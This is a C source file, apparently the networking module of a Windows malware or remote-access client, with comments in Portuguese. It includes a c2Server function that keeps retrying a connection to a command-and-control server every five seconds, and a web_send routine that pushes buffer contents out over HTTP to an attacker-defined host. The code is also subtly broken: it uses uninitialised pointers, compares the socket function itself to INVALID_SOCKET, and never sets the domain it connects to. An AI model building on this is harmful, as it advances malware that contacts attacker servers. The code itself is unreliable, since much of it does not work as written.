  #include "network.h"
  #include <string.h>
  SOCKET global;
  //ler a documentaÃ§ao
  void zero(char * buffer)
  {
  memset(buffer,0,strlen(buffer));
  
  
  }
  SOCKET buildsocket(){
  WSADATA wsa;
  if(WSAStartup(MAKEWORD(2,2),&wsa)!=0){
  return(INVALID_SOCKET);
  }
  
  global=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if(socket==INVALID_SOCKET){
  return(INVALID_SOCKET);}
  
  return(global);
  
  }
  BOOL c2Server(char *ip,int port,SOCKET s){
  WSADATA wsa;
  struct sockaddr_in cliente;
  struct sockaddr_in *ptr;
  
  ptr=&cliente;
  cliente.sin_addr.s_addr=inet_addr(ip);
  cliente.sin_family=AF_INET;
  cliente.sin_port=htons(port);
  if(WSAStartup(MAKEWORD(2,2),&wsa)!=0){
      //printf("erro wsastartup \n");
  
  }
  while(2){
          Sleep(5000);
      if(connect(global,ptr,sizeof cliente)==0){
          //printf(" conexao aceita \n");
          break;
      }
  else{
      //printf("tentando se conectar \n");
  }
  }
  
  
  return TRUE;}//loop   que tenta se conectar
  void  conect_web(char *domain,int port,SOCKET socket){
  
  WSADATA wsa;
  struct sockaddr_in cliente;
  struct sockaddr_in *ptr;
  SOCKET s;
  struct  hostent  *d;
  domain=gethostbyname(d);
  ptr=&cliente;
  cliente.sin_addr.s_addr=*((unsigned long*)d->h_addr);
  cliente.sin_family=AF_INET;
  cliente.sin_port=htons(port);
  if(WSAStartup(MAKEWORD(2,2),&wsa)!=0){
      //printf("erro wsastartup \n");
  
  }
  while(2){
          Sleep(5000);
      if(connect(global,ptr,sizeof cliente)==0){
          //printf(" conexao aceita \n");
          break;
      }
  else{
      //printf("tentando se conectar \n");
  }
  }
  
  }
  void web_send(char *request,SOCKET web,char *buffer){
  char *domain;//defina seu host
  conect_web(domain,80,web);
  char http[12488];
  
  zero(http);
  sprintf(http,request,buffer);
  send(web,http,strlen(http),0);
  recv(web,buffer,12488,0);
   closesocket(global);
    WSACleanup();
    Sleep(3000);
  
  
  
  
  }
  
  
  
  
  
  
  
  
  
  
